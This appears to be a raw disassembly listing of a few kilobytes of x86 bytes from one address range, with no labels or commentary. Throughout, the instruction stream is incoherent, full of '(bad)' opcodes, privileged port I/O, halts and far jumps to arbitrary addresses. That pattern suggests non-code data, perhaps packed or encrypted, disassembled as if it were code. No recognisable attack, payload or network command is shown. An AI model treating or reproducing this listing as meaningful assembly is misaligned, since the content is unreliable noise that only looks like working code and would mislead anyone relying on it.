  41217e:	jne    0x412140
  412180:	rcr    DWORD PTR [eax+eax*1],0x96
  412184:	in     eax,0x87
  412186:	cmp    esi,esp
  412188:	int    0xfd
  41218a:	cmp    BYTE PTR [ebx-0x6542bc78],al
  412190:	mov    BYTE PTR [ebx+0x0],al
  412193:	add    BYTE PTR [eax],al
  412195:	add    BYTE PTR [eax],al
  412197:	dec    ebp
  412198:	call   0x870:0x1d6d73fa
  41219f:	bound  ebp,QWORD PTR [edi+0x613583e9]
  4121a5:	inc    eax
  4121a6:	clc    
  4121a7:	leave  
  4121a8:	loopne 0x412138
  4121aa:	or     BYTE PTR [ebp-0x13f7ac04],ah
  4121b0:	outs   dx,BYTE PTR ds:[esi]
  4121b1:	stc    
  4121b2:	jmp    0x567a8222
  4121b7:	retf   
  4121b8:	mov    eax,0xb7664fcc
  4121bd:	push   esi
  4121be:	push   eax
  4121bf:	and    ch,BYTE PTR ds:0xd1b08910
  4121c5:	jmp    0x4121c9
  4121c7:	inc    esi
  4121c8:	test   eax,0xb2ae5e57
  4121cd:	(bad)  
  4121ce:	or     BYTE PTR [ebp+0xe],dh
  4121d1:	mov    ebp,esp
  4121d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d4:	sbb    cl,BYTE PTR [edi-0x77]
  4121d7:	in     al,dx
  4121d8:	pop    edi
  4121d9:	mov    WORD PTR [eax],es
  4121db:	je     0x4121c6
  4121dd:	add    DWORD PTR [eax-0x77716bd0],ecx
  4121e3:	je     0x4121cf
  4121e5:	add    DWORD PTR [eax],eax
  4121e7:	std    
  4121e8:	push   ss
  4121e9:	cli    
  4121ea:	and    DWORD PTR [edi+0x30894af5],0xfffffff1
  4121f1:	sub    al,0xcd
  4121f3:	bound  eax,QWORD PTR es:[ebp-0x8]
  4121f7:	cld    
  4121f8:	push   cs
  4121f9:	or     al,0x56
  4121fb:	add    BYTE PTR [eax],al
  4121fd:	add    BYTE PTR [eax],al
  4121ff:	add    BYTE PTR [ebx+0x70f8ac02],ch
  412205:	lods   al,BYTE PTR ds:[esi]
  412206:	aam    0xf8
  412208:	out    dx,eax
  412209:	push   cs
  41220a:	in     eax,dx
  41220b:	add    esp,DWORD PTR [esi]
  41220d:	hlt    
  41220e:	fidiv  WORD PTR [ecx+0x1871f43e]
  412214:	cmp    BYTE PTR [ebx-0x25],0x1
  412218:	in     eax,dx
  412219:	push   cs
  41221a:	call   0xe5474d27
  41221f:	or     BYTE PTR [ebx],ah
  412221:	shr    dl,1
  412223:	int    0xec
  412225:	dec    esp
  412226:	pop    ds
  412227:	cmp    DWORD PTR [edx],0xfffffff3
  41222a:	out    0x3,eax
  41222c:	jne    0x4121b6
  41222e:	fild   DWORD PTR [edx]
  412230:	xchg   DWORD PTR [esi],eax
  412232:	ror    DWORD PTR [ebx+0x46fe3b70],0x6d
  412239:	ins    DWORD PTR es:[edi],dx
  41223a:	sub    eax,0x9c88cc5a
  41223f:	clc    
  412240:	std    
  412241:	mov    edi,esp
  412243:	add    dh,BYTE PTR [ebp+0x2]
  412246:	jno    0x41228e
  412248:	sbb    ecx,DWORD PTR [edx-0xcedfda1]
  41224e:	out    0x58,eax
  412250:	xor    al,al
  412252:	jmp    0x412257
  412254:	test   al,0x87
  412256:	shl    BYTE PTR [edx+esi*1],0x7d
  41225a:	mov    dh,0x6f
  41225c:	xchg   edx,eax
  41225d:	dec    edi
  41225e:	adc    eax,0x9726e78d
  412263:	lea    eax,[eax]
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [eax],al
  412269:	mov    esp,edi
  41226b:	jno    0x4122c4
  41226d:	xchg   ecx,eax
  41226e:	adc    bl,cl
  412270:	punpckhdq mm0,QWORD PTR [ecx+0x5f]
  412274:	adc    ecx,DWORD PTR [esi+eax*2+0x460fcb]
  41227b:	mov    edx,0x4335ca
  412280:	cld    
  412281:	xchg   ebp,eax
  412282:	push   ebx
  412283:	pop    ecx
  412284:	push   cs
  412285:	mov    bl,0x9
  412287:	add    BYTE PTR [ecx+esi*8+0x6ea489e5],bh
  41228e:	sub    esp,0xc76f9e5
  412294:	jmp    0xea149f16
  412299:	jbe    0x41229d
  41229b:	push   ecx
  41229c:	ins    BYTE PTR es:[edi],dx
  41229d:	sub    edi,edx
  41229f:	push   esi
  4122a0:	add    al,BYTE PTR [ebx+0x58]
  4122a3:	mov    DWORD PTR [eax],esi
  4122a5:	fadd   DWORD PTR [ebx]
  4122a7:	(bad)  
  4122a8:	lods   al,BYTE PTR ds:[esi]
  4122a9:	pop    ebp
  4122aa:	add    ecx,DWORD PTR [ebx-0x7eaea154]
  4122b0:	xchg   esp,eax
  4122b1:	jp     0x4122b5
  4122b3:	jbe    0x412291
  4122b5:	clc    
  4122b6:	push   ss
  4122b7:	or     eax,0xfdfebb06
  4122bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122bd:	cmp    eax,0x79020f7b
  4122c2:	enter  0xe8ff,0xb7
  4122c6:	inc    eax
  4122c7:	jae    0x412298
  4122c9:	jp     0x412283
  4122cb:	dec    ebx
  4122cc:	loope  0x4122ce
  4122ce:	add    BYTE PTR [eax],al
  4122d0:	add    BYTE PTR [eax],al
  4122d2:	out    dx,al
  4122d3:	sar    DWORD PTR [edi-0x6583883d],0x19
  4122da:	test   BYTE PTR [edx+0x0],al
  4122dd:	not    al
  4122df:	push   ebp
  4122e0:	imul   DWORD PTR [edx+0x10]
  4122e3:	add    al,0x89
  4122e5:	mov    ebx,0xa804d1b8
  4122ea:	rol    DWORD PTR [esi],cl
  4122ec:	or     DWORD PTR [eax+0x143080ef],ebx
  4122f2:	xor    DWORD PTR [edx],eax
  4122f4:	sub    DWORD PTR [esi-0x71847d8a],0x4b7a70
  4122fe:	inc    ecx
  4122ff:	pusha  
  412300:	adc    ecx,DWORD PTR [edi]
  412302:	cmp    BYTE PTR [ebx],0xfa
  412305:	cmp    esi,0x9
  412308:	mov    ebp,0xe5c69ee2
  41230d:	push   es
  41230e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41230f:	mov    ebx,0x737c918a
  412314:	inc    eax
  412315:	add    BYTE PTR [edi],dh
  412317:	add    al,0xb2
  412319:	cmp    eax,0x2fb6b1c
  41231e:	ret    0xb08
  412321:	mov    dh,0xc9
  412323:	jmp    0x4123a4
  412325:	loope  0x412392
  412327:	jnp    0x4122ae
  412329:	xor    BYTE PTR [ecx],ah
  41232b:	inc    ebp
  41232c:	add    bl,ch
  41232e:	dec    esi
  41232f:	mov    dh,0x39
  412331:	cmp    cl,0x14
  412334:	add    BYTE PTR [eax+eax*1+0x0],dh
  412338:	add    BYTE PTR [eax],al
  41233a:	add    BYTE PTR ds:0xf2f3b608,bh
  412340:	jge    0x412372
  412342:	jb     0x825114bb
  412348:	aam    0xb
  41234a:	mov    dh,0x55
  41234c:	push   eax
  41234d:	test   DWORD PTR [eax+0x1e],esi
  412350:	dec    edi
  412351:	test   DWORD PTR [eax+0x10],edx
  412354:	dec    edi
  412355:	test   DWORD PTR [eax+0x12],ecx
  412358:	test   al,al
  41235a:	or     BYTE PTR [edi],dh
  41235c:	push   ss
  41235d:	mov    BYTE PTR [eax],bl
  41235f:	xchg   esi,eax
  412360:	dec    edx
  412361:	icebp  
  412362:	mov    BYTE PTR [edi+eax*1-0x78],dl
  412366:	push   eax
  412367:	push   cs
  412368:	jge    0x4123b2
  41236a:	add    ebx,DWORD PTR [edi-0x3b]
  41236d:	add    al,0x83
  41236f:	cdq    
  412370:	cli    
  412371:	dec    DWORD PTR [esi]
  412373:	push   ebx
  412374:	sub    eax,0x57fbfffb
  412379:	pop    esi
  41237a:	pop    ebx
  41237b:	jne    0x412341
  41237d:	inc    eax
  41237e:	or     BYTE PTR [esp+ebx*4+0x74280005],bh
  412385:	in     eax,0x81
  412387:	leave  
  412388:	ficom  WORD PTR [edx+0x55]
  41238b:	add    BYTE PTR [edi-0x1ccf76fc],dh
  412391:	mov    dl,bh
  412393:	in     al,dx
  412394:	popf   
  412395:	in     eax,dx
  412396:	cmp    DWORD PTR [edx+0x75ad82df],ebp
  41239c:	fild   DWORD PTR [ecx]
  41239e:	push   esi
  41239f:	add    BYTE PTR [eax],al
  4123a1:	add    BYTE PTR [eax],al
  4123a3:	add    BYTE PTR [esi+0x59],al
  4123a6:	xor    dl,dl
  4123a8:	sub    BYTE PTR ds:[edx+0x4e],dh
  4123ac:	inc    edi
  4123ad:	xor    bh,BYTE PTR [ebp-0x39]
  4123b0:	call   0x79bca5a9
  4123b5:	fld    DWORD PTR [edi-0x7d2116f7]
  4123bb:	shl    DWORD PTR [edi+0x14],0x4
  4123bf:	inc    ecx
  4123c0:	add    BYTE PTR [ebx-0x6745c330],bl
  4123c6:	or     cl,BYTE PTR ds:0x88871b0b
  4123cc:	test   al,0x76
  4123ce:	inc    ecx
  4123cf:	add    BYTE PTR [esi],bl
  4123d1:	fsubr  QWORD PTR [edi]
  4123d3:	(bad)  
  4123d4:	icebp  
  4123d5:	and    ch,BYTE PTR [ebp+0xb]
  4123d8:	cmc    
  4123d9:	loop   0x4123fb
  4123db:	mov    esi,DWORD PTR [esp+ebx*4-0x27cb6bfd]
  4123e2:	leave  
  4123e3:	and    bh,BYTE PTR ds:0x3872d315
  4123e9:	pop    esi
  4123ea:	leave  
  4123eb:	je     0x41245f
  4123ed:	daa    
  4123ee:	test   bh,0xfd
  4123f1:	and    eax,0x5c37f80d
  4123f6:	cli    
  4123f7:	add    al,0x61
  4123f9:	add    dl,BYTE PTR [ebp+0x7f]
  4123fc:	jecxz  0x412474
  4123fe:	xor    cl,BYTE PTR [edx+0x3f61ea3e]
  412404:	ret    0x347c
  412407:	sti    
  412408:	add    BYTE PTR [eax],al
  41240a:	add    BYTE PTR [eax],al
  41240c:	add    BYTE PTR [ebp-0x323c161f],dh
  412412:	push   es
  412413:	icebp  
  412414:	ret    0x3dff
  412417:	jno    0x4123a5
  412419:	ss out dx,al
  41241b:	popa   
  41241c:	ret    
  41241d:	mov    ch,0xe1
  41241f:	in     eax,dx
  412420:	or     DWORD PTR [esi],ebp
  412422:	jmp    0x41244b
  412424:	loop   0x41249f
  412426:	ret    0x23f
  412429:	jg     0x4123ef
  41242b:	pop    edi
  41242c:	inc    edi
  41242d:	cmp    DWORD PTR [ebp-0x63],0xfffffff4
  412431:	inc    esp
  412432:	mov    ecx,0x856e3f6f
  412437:	sbb    DWORD PTR [esi-0x7a],esi
  41243a:	jnp    0x4123f0
  41243c:	out    dx,eax
  41243d:	out    dx,eax
  41243e:	inc    ebp
  41243f:	hlt    
  412440:	neg    DWORD PTR [eax+0x45]
  412443:	adc    ecx,DWORD PTR [ebx+edi*2+0x756f2085]
  41244a:	inc    ecx
  41244b:	ror    cl,cl
  41244d:	rcr    ebx,0xc2
  412450:	aam    0x68
  412452:	test   BYTE PTR [edx-0x6a10cf0c],bl
  412458:	mov    BYTE PTR [esi+0x6d3ec2f6],dh
  41245e:	dec    edi
  41245f:	inc    edx
  412460:	retf   
  412461:	aaa    
  412462:	cli    
  412463:	out    0x4d,al
  412465:	cld    
  412466:	icebp  
  412467:	popa   
  412468:	std    
  412469:	repnz add BYTE PTR [edx-0x7],ch
  41246d:	add    dh,BYTE PTR [ebp-0x25]
  412470:	xchg   BYTE PTR [eax],al
  412472:	add    BYTE PTR [eax],al
  412474:	add    BYTE PTR [eax],al
  412476:	cmp    al,BYTE PTR [ecx]
  412478:	adc    dh,bl
  41247a:	(bad)  
  41247b:	cmp    eax,DWORD PTR [eax]
  41247d:	mov    dh,0xfc
  41247f:	adc    eax,0xed46fb06
  412484:	mov    cl,bh
  412486:	ss inc edi
  412488:	jae    0x41241f
  41248a:	sub    cl,al
  41248c:	aaa    
  41248d:	sbb    eax,0xde740695
  412492:	xor    ebp,ebp
  412494:	je     0x412463
  412496:	outs   dx,BYTE PTR ds:[esi]
  412497:	pop    eax
  412498:	std    
  412499:	aam    0x3a
  41249b:	sbb    BYTE PTR [eax-0x17],al
  41249e:	cmc    
  41249f:	lds    ecx,FWORD PTR [esp+ebx*2]
  4124a2:	popa   
  4124a3:	in     eax,dx
  4124a4:	sub    DWORD PTR [ecx],0xa
  4124a7:	cld    
  4124a8:	mov    DWORD PTR [ebp-0x1acf12ba],ebp
  4124ae:	inc    esi
  4124af:	cmp    dh,BYTE PTR [ebx+0x57]
  4124b2:	mov    ah,0x5
  4124b4:	add    BYTE PTR [ebp+ebp*8-0x5a65b023],bl
  4124bb:	lds    edx,FWORD PTR [esi-0x62]
  4124be:	(bad)  
  4124bf:	cmp    ebp,edi
  4124c1:	popa   
  4124c2:	mov    ebx,0xee7066ec
  4124c7:	add    bh,bh
  4124c9:	call   0x5431a044
  4124ce:	jbe    0x4124bd
  4124d0:	std    
  4124d1:	jmp    0xaf8021c4
  4124d6:	cwde   
  4124d7:	sub    ecx,edx
  4124d9:	jnp    0x4124db
  4124db:	add    BYTE PTR [eax],al
  4124dd:	add    BYTE PTR [eax],al
  4124df:	and    DWORD PTR [eax+esi*8+0x62],edi
  4124e3:	sub    al,0x0
  4124e5:	mov    dh,0x9c
  4124e7:	sub    DWORD PTR [ebx+ebx*2-0xf],edi
  4124eb:	cwde   
  4124ec:	(bad)  
  4124ed:	push   ss
  4124ee:	jae    0x41255f
  4124f0:	add    dl,cl
  4124f2:	jmp    0x974f11ac
  4124f7:	mov    ah,0xec
  4124f9:	mov    al,BYTE PTR [eax]
  4124fb:	adc    BYTE PTR [edi],al
  4124fd:	inc    BYTE PTR [ebp+0x33]
  412500:	outs   dx,DWORD PTR ds:[esi]
  412501:	push   ds
  412502:	mov    al,cl
  412504:	push   es
  412505:	or     esi,DWORD PTR [esi+0x4d37f181]
  41250b:	loopne 0x412577
  41250d:	add    al,0xc6
  41250f:	cdq    
  412510:	icebp  
  412511:	add    BYTE PTR [esi-0x6d],al
  412514:	imul   ecx,ebx,0x5f
  412517:	xchg   edx,eax
  412518:	cmp    eax,0x1c4c2c5
  41251d:	push   0x19d02
  412522:	jmp    FWORD PTR [eax-0x337cf7db]
  412528:	cli    
  412529:	dec    edi
  41252a:	call   FWORD PTR [ecx-0x63bfe9d3]
  412530:	test   ah,al
  412532:	or     al,0x5e
  412534:	cli    
  412535:	jmp    DWORD PTR [edi-0x72]
  412538:	push   es
  412539:	add    BYTE PTR [eax],al
  41253b:	shufps xmm0,XMMWORD PTR [eax+edx*2],0xb3
  412540:	push   0x24
  412542:	or     al,0x0
  412544:	add    BYTE PTR [eax],al
  412546:	add    BYTE PTR [eax],al
  412548:	mov    ds:0xc164c0b,eax
  41254d:	add    DWORD PTR [edi-0x3c],edi
  412550:	pusha  
  412551:	mov    DWORD PTR [eax+eax*1],0xe980eec7
  412558:	pop    esp
  412559:	jne    0x412565
  41255b:	dec    ecx
  41255c:	jmp    0x48b1aa76
  412561:	outs   dx,BYTE PTR ds:[esi]
  412562:	push   eax
  412563:	or     BYTE PTR [edi+0x54],bl
  412566:	jg     0x412528
  412568:	sbb    BYTE PTR [ebx-0x18],cl
  41256b:	push   ecx
  41256c:	adc    esi,eax
  41256e:	sti    
  41256f:	ret    
  412570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412571:	jmp    0x755e0ef6
  412576:	and    eax,0x154f7549
  41257b:	or     DWORD PTR [eax+ebx*8],0x9b470175
  412582:	(bad)  
  412583:	mov    ebx,eax
  412585:	outs   dx,DWORD PTR ds:[esi]
  412586:	(bad)  
  412587:	call   0xfe33da6b
  41258c:	into   
  41258d:	mov    esp,0x706d70f2
  412592:	mov    ebx,0x7ee745fd
  412597:	(bad)  
  412598:	(bad)  
  412599:	lods   al,BYTE PTR ds:[esi]
  41259a:	ftst   
  41259c:	sar    DWORD PTR [ebx-0xe],0xe9
  4125a0:	outs   dx,BYTE PTR ds:[esi]
  4125a1:	pop    eax
  4125a2:	rol    DWORD PTR [ebx+ecx*2],0x70
  4125a6:	mov    edi,0xf2774ce8
  4125ab:	std    
  4125ac:	add    BYTE PTR [eax],al
  4125ae:	add    BYTE PTR [eax],al
  4125b0:	add    ch,ah
  4125b2:	fld    st(6)
  4125b4:	and    DWORD PTR [ebx-0x4acef933],0x17
  4125bb:	jle    0x4125c5
  4125bd:	test   BYTE PTR [ecx+0x1],0x74
  4125c1:	inc    ecx
  4125c2:	mov    ds:0xaf2c2675,al
  4125c7:	sbb    al,BYTE PTR [edi-0x17]
  4125ca:	leave  
  4125cb:	cmp    al,0x73
  4125cd:	pop    edi
  4125ce:	popa   
  4125cf:	xlat   BYTE PTR ds:[ebx]
  4125d0:	mov    DWORD PTR [edx],esi
  4125d2:	popa   
  4125d3:	(bad)  
  4125d4:	call   0xfe3349f0
  4125d9:	pop    esi
  4125da:	retf   0x5b
  4125dd:	pop    esi
  4125de:	fcomp  DWORD PTR [ebx-0x1]
  4125e1:	test   al,0xb4
  4125e3:	jle    0x4125ae
  4125e5:	dec    ebp
  4125e6:	ss in  eax,dx
  4125e8:	std    
  4125e9:	xor    bl,BYTE PTR [ecx]
  4125eb:	bnd jo 0x41266b
  4125ee:	pusha  
  4125ef:	mov    edi,0x7ee5a5fd
  4125f4:	(bad)
  4125f7:	mov    edx,0xdeef01dc
  4125fc:	icebp  
  4125fd:	sbb    al,0xfe
  4125ff:	imul   eax,esp,0xda624f79
  412605:	in     al,dx
  412606:	mov    ebx,0xebecf1cf
  41260b:	mov    esi,0x62bfb37d
  412610:	inc    eax
  412611:	cdq    
  412612:	push   es
  412613:	(bad)  
  412614:	sti    
  412615:	add    BYTE PTR [eax],al
  412617:	add    BYTE PTR [eax],al
  412619:	add    BYTE PTR [eax+0x39],al
  41261c:	xor    BYTE PTR [ecx-0x4],bl
  41261f:	repnz adc edx,DWORD PTR [esi]
  412622:	xor    dh,BYTE PTR [ebp-0xd]
  412625:	pop    ebp
  412626:	je     0x412657
  412628:	mov    ecx,0x2000337f
  41262d:	stc    
  41262e:	mov    ds:0x9c0687c1,al
  412633:	std    
  412634:	add    BYTE PTR ds:0x4a5cd064,al
  41263a:	ja     0x412685
  41263c:	pop    esi
  41263d:	repz shl dl,cl
  412640:	jmp    0x7502:0xc6769d53
  412647:	ja     0x412698
  412649:	xchg   DWORD PTR [eax+0x76],edi
  41264c:	loop   0x4126ca
  41264e:	mov    ecx,0xd1dbeb26
  412653:	jmp    0x41268b
  412655:	icebp  
  412656:	test   cl,0xb3
  412659:	add    esp,ebp
  41265b:	cmp    eax,0xb8f613cb
  412660:	xchg   ebx,eax
  412661:	add    eax,0xc96200f2
  412666:	dec    esp
  412667:	cli    
  412668:	mov    ch,0xdb
  41266a:	into   
  41266b:	pop    ebx
  41266c:	call   0x9f038a74
  412671:	push   ecx
  412672:	aaa    
  412673:	cli    
  412674:	(bad)  
  412675:	call   0x6330a036
  41267a:	sbb    DWORD PTR [edx+0xe9e7],eax
  412680:	add    BYTE PTR [eax],al
  412682:	add    BYTE PTR [edx+0x62554719],cl
  412688:	and    edi,0x32068aea
  41268e:	test   eax,0x1f55c1a4
  412693:	jo     0x41267d
  412695:	call   0xfe2e0b88
  41269a:	push   ss
  41269b:	ror    BYTE PTR [ebx],0xfd
  41269e:	cmp    ecx,ebx
  4126a0:	jns    0x41266c
  4126a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126a3:	inc    esi
  4126a4:	push   es
  4126a5:	mov    DWORD PTR [edi-0x70172bb7],esp
  4126ab:	shr    esp,1
  4126ad:	std    
  4126ae:	cmp    BYTE PTR [ecx+0x4cedc081],0x79
  4126b5:	into   
  4126b6:	xchg   ecx,eax
  4126b7:	cmp    ecx,ebp
  4126b9:	std    
  4126ba:	jbe    0x4126a2
  4126bc:	jmp    0xe589:0x553caa5b
  4126c3:	pop    edx
  4126c4:	dec    BYTE PTR [eax+0x73ecf358]
  4126ca:	in     eax,dx
  4126cb:	dec    ecx
  4126cc:	ret    0x9ce9
  4126cf:	stc    
  4126d0:	stc    
  4126d1:	adc    BYTE PTR [eax+0x76],0x6e
  4126d5:	xor    eax,0x4723e2b0
  4126da:	mov    ebp,0xe2744188
  4126df:	lahf   
  4126e0:	jne    0x4126c9
  4126e2:	mov    ebx,0x1efbaa2e
  4126e7:	add    BYTE PTR [eax],al
  4126e9:	add    BYTE PTR [eax],al
  4126eb:	add    BYTE PTR [ebp-0x24],al
  4126ee:	xor    BYTE PTR [ebx-0x7cfd248a],al
  4126f4:	ja     0x412746
  4126f6:	mov    DWORD PTR [eax],eax
  4126f8:	arpl   WORD PTR [esi-0x36],sp
  4126fb:	call   0x3d0063
  412700:	ja     0x412727
  412702:	sti    
  412703:	jo     0x412719
  412705:	addr16 retf 
  412707:	jmp    FWORD PTR [edx+edi*8+0x6824c686]
  41270e:	idiv   edi
  412710:	sub    ecx,esi
  412712:	or     DWORD PTR [edx-0x71],edx
  412715:	mov    esi,0x6e138b04
  41271a:	into   
  41271b:	call   0x3d0448
  412720:	push   edi
  412721:	rcr    DWORD PTR [ebx+0x5e],0xe
  412725:	sti    
  412726:	dec    DWORD PTR [edx+0x244c6ce2]
  41272c:	les    ebp,FWORD PTR ds:0xcece7548
  412732:	in     eax,0x57
  412734:	jge    0x4126fc
  412736:	mov    DWORD PTR [esi-0x63],ebp
  412739:	add    eax,0xd911f887
  41273e:	je     0x41275f
  412740:	sub    ebp,DWORD PTR [edx+0x24]
  412743:	or     al,0x17
  412745:	dec    edx
  412746:	and    al,0xc
  412748:	pop    es
  412749:	test   eax,0x6a24c687
  41274e:	sti    
  41274f:	inc    DWORD PTR [eax]
  412751:	add    BYTE PTR [eax],al
  412753:	add    BYTE PTR [eax],al
  412755:	sub    edi,DWORD PTR [ebx-0x40]
  412758:	je     0x4126f0
  41275a:	jp     0x412733
  41275c:	je     0x4127bc
  41275e:	dec    WORD PTR [edx+0x5708cd93]
  412765:	mov    ah,0x84
  412767:	outs   dx,BYTE PTR ds:[esi]
  412768:	add    DWORD PTR [esp+esi*1-0x40],ecx
  41276c:	pop    edi
  41276d:	sahf   
  41276e:	out    0xfd,al
  412770:	mov    al,BYTE PTR [esp+esi*1-0x2e]
  412774:	push   esi
  412775:	jne    0x4127cd
  412777:	mov    ebx,0xc45c6674
  41277c:	add    al,0xfe
  41277e:	stos   BYTE PTR es:[edi],al
  41277f:	sub    dh,BYTE PTR [ecx+edx*2-0xd]
  412783:	jne    0x412793
  412785:	mov    bh,0x5c
  412787:	les    eax,FWORD PTR [esi+ebx*2]
  41278a:	or     dh,BYTE PTR [edx-0x10]
  41278d:	inc    edi
  41278e:	fwait
  41278f:	dec    ebx
  412790:	ret    0xdb71
  412793:	mov    cl,0xff
  412795:	psrlq  mm3,QWORD PTR [eax-0x77]
  412799:	or     DWORD PTR [edx-0x23],ebx
  41279c:	or     al,0x74
  41279e:	fild   DWORD PTR [ecx]
  4127a0:	push   esi
  4127a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127a2:	mov    cl,0x7a
  4127a4:	inc    ebx
  4127a5:	test   esp,esi
  4127a7:	ret    
  4127a8:	jbe    0x4127d2
  4127aa:	pop    esp
  4127ab:	jmp    0x332771ad
  4127b0:	ror    BYTE PTR [ebx+edx*4],cl
  4127b3:	add    al,BYTE PTR [eax]
  4127b5:	jne    0x41273f
  4127b7:	hlt    
  4127b8:	add    BYTE PTR [bx+si],al
  4127bb:	add    BYTE PTR [eax],al
  4127bd:	add    BYTE PTR [edi+0x75000282],ah
  4127c3:	jb     0x41280d
  4127c5:	clc    
  4127c6:	cld    
  4127c7:	or     eax,0xcb3889f0
  4127cc:	inc    ecx
  4127cd:	cmc    
  4127ce:	mov    ebp,0x408bc1d3
  4127d3:	arpl   WORD PTR [edx],sp
  4127d5:	mov    edi,0x8b53b125
  4127da:	clc    
  4127db:	inc    esi
  4127dc:	jmp    0x4127db
  4127de:	jp     0x41278a
  4127e0:	push   ebx
  4127e1:	(bad)  
  4127e4:	jmp    0x4127e3
  4127e6:	push   0xffffffdb
  4127e8:	add    DWORD PTR [eax],eax
  4127ea:	jne    0x41284e
  4127ec:	mov    al,0xf8
  4127ee:	pop    ebx
  4127ef:	sbb    esi,ebp
  4127f1:	std    
  4127f2:	push   0xb5183702
  4127f7:	add    ch,BYTE PTR [edx-0x15]
  4127fa:	inc    edx
  4127fb:	outs   dx,DWORD PTR ds:[esi]
  4127fc:	rcl    DWORD PTR [ebp+0x38],0x6e
  412800:	fucomi st,st(6)
  412802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412803:	cli    
  412804:	popf   
  412805:	out    dx,al
  412806:	xchg   BYTE PTR [edx],ah
  412808:	aad    0x43
  41280a:	jne    0x412837
  41280c:	sub    eax,0xa4197d6d
  412811:	call   DWORD PTR [ebx]
  412813:	aas    
  412814:	out    dx,eax
  412815:	sub    al,BYTE PTR [esi+0x447d5df6]
  41281b:	ret    0x7710
  41281e:	imul   esi,edi,0xc472
  412824:	add    BYTE PTR [eax],al
  412826:	add    BYTE PTR [ebx-0x47],dl
  412829:	test   eax,0xa7347500
  41282e:	fld1   
  412830:	dec    ebp
  412831:	(bad)  
  412832:	loopne 0x41285e
  412834:	dec    edi
  412835:	ret    0xd00c
  412838:	ins    DWORD PTR es:[edi],dx
  412839:	idiv   DWORD PTR [eax+0x4e]
  41283c:	cli    
  41283d:	popf   
  41283e:	aas    
  41283f:	jno    0x41289d
  412841:	call   0x38285ec4
  412846:	fmul   QWORD PTR [eax-0x19]
  412849:	xchg   ch,ch
  41284b:	icebp  
  41284c:	ret    0xfef3
  41284f:	cmc    
  412850:	gs jecxz 0x412856
  412853:	es in  al,0x37
  412856:	add    esi,DWORD PTR [eax]
  412858:	mov    ecx,0x34750029
  41285d:	daa    
  41285e:	(bad)  [eax+0x1ece75c]
  412864:	push   ds
  412865:	imul   esp
  412867:	jmp    0xe22dff8a
  41286c:	push   ds
  41286d:	xlat   BYTE PTR ds:[ebx]
  41286e:	in     al,dx
  41286f:	xchg   BYTE PTR [edx],ch
  412871:	add    bh,bl
  412873:	mov    dh,0x2
  412875:	cmp    DWORD PTR [ebp+0x7d0cf69a],esp
  41287b:	xor    esp,eax
  41287d:	or     al,0xe9
  41287f:	inc    ecx
  412880:	scas   al,BYTE PTR es:[edi]
  412881:	add    eax,0x6a009cbf
  412886:	call   0xd1550e51
  41288b:	add    BYTE PTR [eax],al
  41288d:	add    BYTE PTR [eax],al
  41288f:	add    BYTE PTR [eax+0x29720042],al
  412895:	cmp    esi,0x311da2f6
  41289b:	sub    DWORD PTR [ebx+0x9eb3d81],ebx
  4128a1:	xchg   esp,eax
  4128a2:	shl    BYTE PTR [ecx],0xf4
  4128a5:	loope  0x41289b
  4128a7:	push   0x36
  4128a9:	push   es
  4128aa:	push   eax
  4128ab:	ss dec ebx
  4128ad:	in     eax,0x13
  4128af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128b0:	add    DWORD PTR [edx+0x0],0x64
  4128b4:	mov    dh,0x6d
  4128b6:	or     bl,BYTE PTR [edi]
  4128b8:	enter  0x3412,0xd7
  4128bc:	add    al,BYTE PTR ss:[ecx-0x39872649]
  4128c3:	aas    
  4128c4:	mov    ah,0x52
  4128c6:	mov    DWORD PTR [ebp+0x36513727],eax
  4128cc:	sbb    esp,DWORD PTR [edi-0x52560e40]
  4128d2:	fdivr  DWORD PTR [edx-0x1ebc856f]
  4128d8:	inc    esi
  4128d9:	dec    ebp
  4128da:	push   ebp
  4128db:	outs   dx,BYTE PTR ds:[esi]
  4128dc:	or     edi,edx
  4128de:	xchg   ah,ah
  4128e0:	call   0xd412:0x91617b7e
  4128e7:	cld    
  4128e8:	add    al,BYTE PTR ss:[ebx-0x7f0515d7]
  4128ef:	add    BYTE PTR [esi+edx*8+0x82e5],ah
  4128f6:	add    BYTE PTR [eax],al
  4128f8:	add    BYTE PTR [edx+eax*1+0x0],cl
  4128fc:	push   esi
  4128fd:	xlat   BYTE PTR ds:[ebx]
  4128fe:	ins    BYTE PTR es:[edi],dx
  4128ff:	or     bl,ch
  412901:	push   edx
  412902:	imul   eax,DWORD PTR [esi+0x4],0xffffffdf
  412906:	fld    DWORD PTR [edx]
  412908:	jne    0x412946
  41290a:	xlat   BYTE PTR ds:[ebx]
  41290b:	jbe    0x41291d
  41290d:	arpl   WORD PTR [edi+0x18],bp
  412910:	call   0x3e6df6
  412915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412916:	cmp    al,0xfc
  412918:	jmp    0x412959
  41291a:	cmp    eax,0x17
  41291d:	cdq    
  41291e:	out    0xfc,eax
  412920:	jbe    0x41294e
  412922:	xlat   BYTE PTR ds:[ebx]
  412923:	jbe    0x41293d
  412925:	and    al,0x27
  412927:	imul   eax,DWORD PTR [ecx],0xf841670c
  41292d:	xchg   edi,eax
  41292e:	jo     0x41294c
  412930:	cmp    ecx,ebx
  412932:	jae    0x412902
  412934:	jmp    FWORD PTR [ecx+0x7015fce6]
  41293a:	adc    BYTE PTR [eax+0x0],al
  41293d:	push   edi
  41293e:	inc    ebx
  41293f:	cld    
  412940:	xor    edx,0xffffffd9
  412943:	aaa    
  412944:	(bad)  
  412945:	push   0x7af888eb
  41294a:	addr16 pop eax
  41294c:	add    dh,ah
  41294e:	push   ss
  41294f:	sti    
  412950:	inc    DWORD PTR [ebx]
  412952:	lock mov si,WORD PTR [ecx-0x2a]
  412957:	cmp    edi,0xfe7f11a8
  41295d:	add    BYTE PTR [eax],al
  41295f:	add    BYTE PTR [eax],al
  412961:	add    BYTE PTR [ebx],ah
  412963:	jae    0x41296c
  412965:	adc    ax,0x239
  412969:	call   0x3d02eb
  41296e:	pop    es
  41296f:	out    dx,al
  412970:	sti    
  412971:	jne    0x4129e8
  412973:	dec    edi
